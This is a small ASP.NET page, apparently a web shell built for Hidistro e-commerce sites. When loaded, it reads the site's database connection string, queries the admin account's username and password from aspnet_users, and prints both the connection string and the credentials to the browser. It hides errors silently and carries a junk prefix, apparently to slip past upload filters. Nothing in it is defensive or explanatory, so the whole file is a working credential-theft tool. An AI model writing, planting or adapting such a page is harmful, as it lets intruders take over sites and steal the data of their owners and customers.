dfszx<%@ Page Language="C#" %><%@ import Namespace="System.Data.SqlClient"%>
<%
try
{
    //string str = "server=.;uid=sa;pwd=mydesql;database=lqh";
    string str =System.Configuration.ConfigurationManager.ConnectionStrings["HidistroSqlServer"].ToString();
    SqlConnection conn = new SqlConnection(str);
    SqlCommand cmd = new SqlCommand("select UserName,Password from aspnet_users WHERE UserId = 1101 or UserName = 'admin'", conn);
    conn.Open();
    SqlDataReader dr = cmd.ExecuteReader();
    Response.Write(str + "<br />");
    while (dr.Read())
    {
        Response.Write(dr.GetValue(0).ToString() + "<br />" + dr.GetValue(1).ToString());
    }
    dr.Close();
    conn.Close();
}
    catch (System.Exception ex)
            {
            }
%>
